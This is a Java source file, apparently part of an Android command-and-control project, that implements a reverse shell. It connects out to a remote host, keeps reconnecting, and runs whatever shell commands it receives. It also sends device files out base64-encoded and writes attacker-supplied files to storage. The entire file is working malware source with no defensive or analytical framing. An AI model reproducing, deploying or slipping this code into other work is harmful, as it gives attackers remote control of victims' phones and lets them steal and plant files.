package org.cyberdemon.c2;

import android.os.Environment;
import android.util.Log;
import java.io.*;
import java.net.Socket;
import java.util.Base64;

public class ReverseShell {
    private static final String TAG = "CYB3R";
    private String host;
    private int port;
    private volatile boolean running = false;
    private String currentDir = "/storage/emulated/0";

    public ReverseShell(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public void start() {
        running = true;
        new Thread(() -> connect()).start();
    }

    public void stop() { running = false; }

    private void connect() {
        while (running) {
            try {
                Socket socket = new Socket(host, port);
                socket.setSoTimeout(120000);
                socket.setKeepAlive(true);

                InputStream in = new BufferedInputStream(socket.getInputStream());
                OutputStream out = new BufferedOutputStream(socket.getOutputStream());
                StringBuilder buf = new StringBuilder();

                while (running) {
                    int ch = in.read();
                    if (ch == -1) break;
                    if (ch == '\n') {
                        String cmd = buf.toString().trim();
                        buf.setLength(0);
                        if (!cmd.isEmpty()) execute(cmd, out);
                    } else {
                        buf.append((char) ch);
                    }
                }
                socket.close();
            } catch (Exception e) {
                Log.e(TAG, "err: " + e.getMessage());
            }
            try { Thread.sleep(3000); } catch (InterruptedException ie) { break; }
        }
    }

    private void execute(String cmd, OutputStream out) {
        try {
            if (cmd.startsWith("DOWNLOAD:")) {
                handleDownload(cmd.substring(9), out);
            } else if (cmd.startsWith("UPLOAD:")) {
                handleUpload(cmd.substring(7), out);
            } else {
                if (cmd.trim().startsWith("cd ")) {
                    String target = cmd.trim().substring(3).trim();
                    Process tp = new ProcessBuilder("/system/bin/sh", "-c", "cd " + target + " && pwd")
                        .directory(new File(currentDir))
                        .redirectErrorStream(true).start();
                    DataInputStream tdis = new DataInputStream(tp.getInputStream());
                    ByteArrayOutputStream tbaos = new ByteArrayOutputStream();
                    byte[] tmp2 = new byte[4096];
                    int len2;
                    while ((len2 = tdis.read(tmp2)) != -1) tbaos.write(tmp2, 0, len2);
                    tp.waitFor();
                    String newPath = tbaos.toString("UTF-8").trim();
                    if (!newPath.isEmpty() && !newPath.contains("No such file")) {
                        currentDir = newPath;
                        out.write(("RESULT:" + currentDir + "\n").getBytes("UTF-8"));
                    } else {
                        out.write(("ERR:cd: " + target + ": No such directory\n").getBytes("UTF-8"));
                    }
                    out.flush();
                } else {
                    Process p = new ProcessBuilder("/system/bin/sh", "-c", cmd)
                        .directory(new File(currentDir))
                        .redirectErrorStream(true).start();
                    DataInputStream dis = new DataInputStream(p.getInputStream());
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] tmp = new byte[4096];
                    int len;
                    while ((len = dis.read(tmp)) != -1) baos.write(tmp, 0, len);
                    p.waitFor();
                    String res = baos.toString("UTF-8");
                    if (res.length() > 10000) res = res.substring(0, 10000);
                    out.write(("RESULT:" + res + "\n").getBytes("UTF-8"));
                    out.flush();
                }
            }
        } catch (Exception e) {
            try {
                out.write(("ERR:" + e.getMessage() + "\n").getBytes("UTF-8"));
                out.flush();
            } catch (Exception ignored) {}
        }
    }

    private void handleDownload(String filePath, OutputStream out) throws Exception {
        File f = new File(filePath);
        if (!f.exists()) {
            out.write(("ERR:File not found: " + filePath + "\n").getBytes("UTF-8"));
            out.flush();
            return;
        }
        if (!f.canRead()) {
            out.write(("ERR:Permission denied: " + filePath + "\n").getBytes("UTF-8"));
            out.flush();
            return;
        }
        if (f.length() > 10 * 1024 * 1024) {
            out.write(("ERR:File too large (>10MB)\n").getBytes("UTF-8"));
            out.flush();
            return;
        }
        FileInputStream fis = new FileInputStream(f);
        byte[] fileBytes = new byte[(int) f.length()];
        fis.read(fileBytes);
        fis.close();
        String b64 = Base64.getEncoder().encodeToString(fileBytes);
        out.write(("FILEDATA:" + f.getName() + ":" + b64 + "\n").getBytes("UTF-8"));
        out.flush();
    }

    private void handleUpload(String data, OutputStream out) throws Exception {
        int colon = data.indexOf(':');
        if (colon == -1) {
            out.write(("ERR:Invalid UPLOAD format\n").getBytes("UTF-8"));
            out.flush();
            return;
        }
        String filePath = data.substring(0, colon);
        String b64 = data.substring(colon + 1);
        byte[] fileBytes = Base64.getDecoder().decode(b64);
        File f = new File(filePath);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) parent.mkdirs();
        FileOutputStream fos = new FileOutputStream(f);
        fos.write(fileBytes);
        fos.close();
        out.write(("RESULT:Uploaded " + fileBytes.length + " bytes to " + filePath + "\n").getBytes("UTF-8"));
        out.flush();
    }
}